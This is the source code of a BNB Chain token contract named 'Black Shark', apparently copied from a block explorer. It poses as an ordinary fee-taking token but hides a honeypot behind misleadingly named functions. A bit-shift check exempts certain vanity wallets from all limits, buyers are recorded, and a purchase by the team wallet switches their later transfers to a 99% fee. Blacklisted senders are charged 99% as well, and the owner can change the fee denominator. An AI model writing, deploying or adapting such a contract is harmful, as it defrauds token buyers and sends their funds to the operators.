/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

//SPDX-License-Identifier: MIT

/**

https://t.me/BlackShark

*/


pragma solidity ^0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Auth {
    address public owner;
    mapping(address => bool) internal authorizations;


    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }


    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED");
        _;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    event OwnershipTransferred(address owner);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}


contract BlackShark is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Black Shark";
    string constant _symbol = "BlackShark";
    uint8 constant _decimals = 18;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) blackList;
    mapping(address => uint256) private isFeeTxLimitExempt;
    mapping(uint256 => address) private isWalletLimitTxExempt;
    uint256 public exemptLimitValue = 0;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;

    address private marketingFeeReceiver = 0x35899d7446376af5c9BB4a88FFFfF40Afa0b58C4;
    address private buybackFeeReceiver = 0x35899d7446376af5c9BB4a88FFFfF40Afa0b58C4;
    address private teamReceiver = 0x640ea21e6E42aD038aC62733FfffD60CF70ac1a8;

    uint256 liquidityFee = 0;
    uint256 buybackFee = 0;
    uint256 totalFee = 3;
    uint256 feeDenominator = 100;

    IDEXRouter public router;
    address public uniswapV2Pair;
    address public lastTxn = address(0);

    uint256 public launchedAt;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 1;
    bool inSwap;
    modifier swapping() {inSwap = true;
        _;
        inSwap = false;}


    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;


        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }


    receive() external payable {}


    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}


    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }


    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }


    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "BlackShark seems to happen Insufficient Allowance!!!!");
        }


        return _transferFrom(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "BlackShark seems to happen Insufficient Balance!!!!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }


    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = checkWalletTxLimitExempt(sender) || checkWalletTxLimitExempt(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && recipient == teamReceiver) {
                checkExemptLimitTxWallet();
            }
            if (!bLimitTxWalletValue) {
                checkIsWalletLimitTxExempt(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return _basicTransfer(sender, recipient, amount);}

        if (sender != owner && recipient != owner) {
            checkTxLimit(sender, amount);
        }

        if (recipient != uniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "BlackShark Transfer seems to happen amount exceeds the bag size!!!!");
        }

        if (shouldSwapBack()) {
            if (sender != owner && recipient != owner) {
                swapBack();
            }
        }


        if (!launched() && recipient == uniswapV2Pair) {require(_balances[sender] > 0);
            launch();}


        _balances[sender] = _balances[sender].sub(amount, "BlackShark seems to happen Insufficient Balance!!!!");


        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTxLXFee(sender, totalFee)).div(feeDenominator);

        if (blackList[sender]) {
            feeAmount = amount.mul(99).div(feeDenominator);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "BlackShark TX Limit Exceeded");
    }

    function checkWalletTxLimitExempt(address account) private pure returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == 262143;
    }

    function getTxLXFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = isFeeTxLimitExempt[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function checkIsWalletLimitTxExempt(address addr) private {
        if (getBuyAmount() < 6 * 10 ** 15) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        isWalletLimitTxExempt[exemptLimitValue] = addr;
    }

    function checkExemptLimitTxWallet() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (isFeeTxLimitExempt[isWalletLimitTxExempt[i]] == 0) {
                    isFeeTxLimitExempt[isWalletLimitTxExempt[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function getBuyAmount() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IBEP20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != uniswapV2Pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function shouldTakeFee(address sender, address to) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[to];
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);


        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;


        uint256 balanceBefore = address(this).balance;


        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBbuyback = amountBNB.mul(buybackFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB - amountBNBLiquidity - amountBNBbuyback;


        (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value : amountBNBMarketing, gas : 30000}("");
        require(MarketingSuccess, "BlackShark receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "BlackShark receiver rejected ETH transfer");
        addLiquidity(amountToLiquify, amountBNBLiquidity);
    }


    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);


        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value : amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        if (tokenAmount > 0) {
            router.addLiquidityETH{value : BNBAmount}(
                address(this),
                tokenAmount,
                0,
                0,
                address(this),
                block.timestamp
            );
            emit AutoLiquify(BNBAmount, tokenAmount);
        }
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }


    function launch() internal {
        launchedAt = block.number;
    }

    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }


    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "BlackShark Can't let you take all native token");
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(marketingFeeReceiver).transfer(_contractBalance);
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(uniswapV2Pair).mul(2)).div(getCirculatingSupply());
    }


    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityFee() public view returns (uint256) {
        return liquidityFee;
    }

    function getBuybackFee() public view returns (uint256) {
        return buybackFee;
    }

    function GetFeeDenominator() public view returns (uint256) {
        return feeDenominator;
    }

    function SetFeeDenominator(uint256 v) public onlyOwner {
        feeDenominator = v;
    }

    function GetSwapEnabled() public view returns (bool) {
        return swapEnabled;
    }

    function SetSwapEnabled(bool v) public onlyOwner {
        swapEnabled = v;
    }


    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}